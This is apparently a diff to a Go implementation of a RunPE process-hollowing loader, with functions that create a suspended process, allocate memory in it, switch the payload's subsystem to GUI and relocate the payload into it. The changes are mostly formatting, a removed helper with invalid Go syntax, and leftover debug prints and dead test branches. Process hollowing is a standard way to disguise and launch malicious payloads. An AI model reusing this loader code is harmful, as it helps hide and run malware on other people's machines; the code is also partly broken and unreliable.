@@ -13,7 +13,6 @@ import (
 	"log"
 	"syscall"
 	"unsafe"
-
 )
 
 //TerminateProcess func
@@ -90,20 +89,12 @@ func VirtualAllocEx(
 func LoadPEModule(fileName string, vSize *uint64, executable, relocate bool) uintptr {
 	var rSize uint64
 	dllRawData := LoadFile(fileName, &rSize)
+	fmt.Println(dllRawData)
 	if dllRawData == 0 {
 		log.Println("Cannot load the file: ", fileName)
 		return 0
 	}
 	mappedDll := _LoadPEModule(dllRawData, rSize, vSize, executable, relocate)
-	FreePEBuffer(dllRawData, 0)
-	return mappedDll
-}
-
-func LoadPEModuleByte(filebytes byte[], vSize *uint64) uintptr {
-	var rSize uint64
-	dllRawData := filebytes
-	rSize = len(filebytes)
-	mappedDll := _LoadPEModule(dllRawData, rSize, vSize, false, false)
 	FreePEBuffer(dllRawData, 0)
 	return mappedDll
 }
@@ -677,7 +668,7 @@ func IsTargetCompatible(
 }
 
 //CreateSuspendedProcess func
-func CreateSuspendedProcess(path string, pi *syscall.ProcessInformation,arguments string) bool {
+func CreateSuspendedProcess(path string, pi *syscall.ProcessInformation, arguments string) bool {
 	var si syscall.StartupInfo
 	siSize := unsafe.Sizeof(syscall.StartupInfo{})
 	Memset(
@@ -1069,34 +1060,34 @@ func _RunPE(
 		return false
 	}
 	log.Printf("Allocated remote ImageBase: %X size: %d\n", remoteBase, payloadImageSize)
-	
+
 	//CHANGE Subsystem
-		idh := (*IMAGE_DOS_HEADER)(unsafe.Pointer(loadedPE))
-		if 0 != 0 {
-			if !ValidatePtr(
-				loadedPE,
-				0,
-				uintptr(unsafe.Pointer(idh)),
-				uint64(unsafe.Sizeof(IMAGE_DOS_HEADER{})),
-			) {
-				fmt.Println("test")
-			}
+	idh := (*IMAGE_DOS_HEADER)(unsafe.Pointer(loadedPE))
+	if 0 != 0 {
+		if !ValidatePtr(
+			loadedPE,
+			0,
+			uintptr(unsafe.Pointer(idh)),
+			uint64(unsafe.Sizeof(IMAGE_DOS_HEADER{})),
+		) {
+			fmt.Println("test")
 		}
-		inh := (*IMAGE_NT_HEADERS)(unsafe.Pointer(loadedPE + uintptr(idh.E_lfanew)))
-		is64b := Is64Bit(loadedPE)
-		payloadNTHdr := unsafe.Pointer(GetNTHdrs(loadedPE, 0))
-		if payloadNTHdr == nil {
-			fmt.Println("err")
-		}
-		if is64b {
-			payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(payloadNTHdr)
-			fmt.Println(string(payloadNTHdr64.OptionalHeader.Subsystem)+"X64");
-			inh.OptionalHeader.Subsystem = 2
-		} else {
-			payloadNTHdr32 := (*IMAGE_NT_HEADERS)(payloadNTHdr)
-			fmt.Println(string(payloadNTHdr32.OptionalHeader.Subsystem)+"X32");
-			inh.OptionalHeader.Subsystem = 2
-		}
+	}
+	inh := (*IMAGE_NT_HEADERS)(unsafe.Pointer(loadedPE + uintptr(idh.E_lfanew)))
+	is64b := Is64Bit(loadedPE)
+	payloadNTHdr := unsafe.Pointer(GetNTHdrs(loadedPE, 0))
+	if payloadNTHdr == nil {
+		fmt.Println("err")
+	}
+	if is64b {
+		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(payloadNTHdr)
+		fmt.Println(string(payloadNTHdr64.OptionalHeader.Subsystem) + "X64")
+		inh.OptionalHeader.Subsystem = 2
+	} else {
+		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(payloadNTHdr)
+		fmt.Println(string(payloadNTHdr32.OptionalHeader.Subsystem) + "X32")
+		inh.OptionalHeader.Subsystem = 2
+	}
 	//2. Relocate the payload (local copy) to the Remote Base:
 	if !RelocateModule(loadedPE, payloadImageSize, remoteBase, 0) {
 		log.Println("Could not relocate the module!")
